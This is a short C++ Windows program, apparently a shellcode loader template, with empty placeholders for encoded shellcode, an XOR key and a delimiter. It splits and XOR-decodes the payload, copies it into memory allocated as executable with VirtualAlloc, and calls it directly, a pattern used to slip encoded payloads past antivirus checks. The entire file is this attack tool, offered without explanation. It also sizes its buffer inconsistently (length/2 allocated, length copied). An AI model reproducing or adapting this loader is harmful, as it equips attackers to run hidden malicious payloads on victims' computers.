
#include <iostream>
#include<Windows.h>

int main(int argc, char* argv[])
{
	char buf[] = ""; /* input shellcode*/
	char buf1[] = "";/* input shellcode*/
	char key[] = "";/* input key*/
	const char *target = "";/* input split*/
	char* p;
	char* q;
	int length = 0;
	int i = 0;
	p = strtok(buf, target);
	while (p) {
		p = strtok(NULL, target);
		length++;
	}
	unsigned char* sc = (unsigned char*)malloc(length / 2);
	q = strtok(buf1, target);
	while (q) {
		std::cout << q << std::endl;
		int tmp = int(atof(q));
		for (int i = strlen(key); i >0; i--) {
			tmp ^= int(key[i-1]);
		}
		sc[i] = (char)tmp;
		q = strtok(NULL, target);
		i++;
	}
	void* exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, sc, length);
	((void(*)())exec)();
}
